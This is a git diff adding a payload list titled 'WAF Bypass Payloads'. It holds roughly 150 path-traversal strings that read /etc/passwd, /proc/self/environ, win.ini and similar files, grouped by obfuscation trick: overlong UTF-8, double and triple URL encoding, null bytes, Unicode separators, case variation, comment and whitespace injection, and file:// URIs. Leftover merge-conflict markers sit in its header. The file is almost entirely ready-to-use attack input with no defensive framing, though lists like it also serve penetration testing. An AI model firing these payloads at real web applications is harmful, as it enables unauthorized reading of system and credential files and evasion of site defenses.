@@ -1,0 +1,174 @@
+# WAF Bypass Payloads
+<<<<<<< Updated upstream
+# Advanced obfuscation techniques for evading Web Application Firewalls
+
+# Unicode/UTF-8 Overlong Encoding
+=======
+# Advanced obfuscation for evading WAFs
+
+# Unicode/UTF-8 overlong encoding
+>>>>>>> Stashed changes
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%e0%80%af..%e0%80%afetc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+..%c1%9c..%c1%9cetc/passwd
+..%c0%ae..%c0%ae..%c0%ae/etc/passwd
+
+# Double URL Encoding
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%255c..%255c..%255cwindows%255cwin.ini
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Triple URL Encoding  
+..%25252f..%25252f..%25252fetc%25252fpasswd
+%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
+
+# Dot variations
+....//....//....//etc/passwd
+....//....//....//....//etc/passwd
+....//....//....//....//....//etc/passwd
+..../..../..../etc/passwd
+..../..../..../..../etc/passwd
+..../..../..../..../..../etc/passwd
+
+# Slash variations
+.././.././.././etc/passwd
+.././.././.././.././etc/passwd
+.\.\.\.\.\.windows\win.ini
+.\.\.\.\.\.\.windows\win.ini
+
+# Missing slash
+/./proc/./self/./environ
+/./etc/./passwd
+/././etc/././passwd
+/./././etc/./././passwd
+
+# Extra slashes
+...//...//.../etc/passwd
+...///...///...///etc/passwd
+..//..//..//etc/passwd
+
+# Backslash double encoding
+..\\..\\..\\windows\\win.ini
+..\\\\..\\\\..\\\\windows\\\\win.ini
+..%5c%5c..%5c%5c..%5c%5cwindows%5c%5cwin.ini
+
+# Mixed slash/backslash
+..\/..\/..\/etc/passwd
+..\/..\/..\/../etc/passwd
+../\../\../\etc/passwd
+
+# Null byte alternatives
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/passwd%00.php
+/etc/passwd%00.txt
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.php
+/etc/passwd%2500
+/etc/passwd%2500.jpg
+../../../etc/passwd%2500
+
+# Double null bytes
+/etc/passwd%00%00
+../../../etc/passwd%00%00.jpg
+
+# Encoded null bytes
+/etc/passwd\x00
+../../../etc/passwd\x00.jpg
+/etc/passwd%u0000
+../../../etc/passwd%u0000.jpg
+
+# Path truncation (PHP < 5.3.4)
+../../../etc/passwd/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+../etc/passwd................................................................................................................................................................................................................................................
+
+# Case variation (Windows)
+..\..\..\..\WiNdOwS\wIn.InI
+..\..\..\..\WiNdOwS\sYsTeM32\DrIvErS\eTc\hOsTs
+..\..\..\..\bOoT.iNi
+../../../ETC/PASSWD
+../../../Etc/Passwd
+
+# Unicode characters
+..%u2216..%u2216etc%u2216passwd
+..%u2215..%u2215etc%u2215passwd
+..%uFF0F..%uFF0F..%uFF0Fetc%uFF0Fpasswd
+
+# Alternative separators
+../|../|../|etc/passwd
+..;<..;<..;<etc/passwd
+
+# Encoding specific characters
+..%2f..%2f..%2fetc%2fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%5c..%5c..%5cwindows%5cwin.ini
+..%5C..%5C..%5Cwindows%5Cwin.ini
+
+# Mixed encoding
+..%2f..%2F../etc/passwd
+..%5c..%5C..\windows\win.ini
+..%2f../..%2fetc/passwd
+
+# Comment injection (path normalization bypass)
+/e/**/tc/p/**/asswd
+/e<!-- -->tc/p<!-- -->asswd
+/e<>tc/p<>asswd
+
+# Whitespace injection
+/etc/ passwd
+/etc/  passwd
+/ etc / passwd
+../../../ etc/ passwd
+
+# Tab characters
+/etc/	passwd
+../../../	etc/	passwd
+
+# Newline characters
+/etc/%0apasswd
+../../../etc/%0apasswd
+/etc/%0dpasswd
+../../../etc/%0dpasswd
+
+# Unicode normalization
+%c0%aeetc%c0%afpasswd
+%c0%ae%c0%ae/etc/passwd
+
+# 16-bit Unicode encoding
+%u002e%u002e%u002fetc%u002fpasswd
+%u002e%u002e%u005cwindows%u005cwin.ini
+
+# Directory separator variations
+..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+
+# Encoded dots
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2E%2E/%2E%2E/%2E%2E/etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# FILEPATH protocol bypass
+file:///etc/passwd
+file:///../../../etc/passwd
+file:///C:/windows/win.ini
+
+# Relative path encoding
+%2e%2e%2fetc%2fpasswd
+%2E%2E%2Fetc%2Fpasswd
+
+# Alternative encoding schemes
+..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
+..&#47;..&#47;..&#47;etc&#47;passwd
+..&#92;..&#92;..&#92;windows&#92;win.ini
+
+# Java/JSP specific
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%25%5c..%25%5c..%25%5c
+
+# ASP/IIS specific
+..%c0%af..%c0%afwindows%c0%afwin.ini
+..%c1%9c..%c1%9cwindows%c1%9cwin.ini
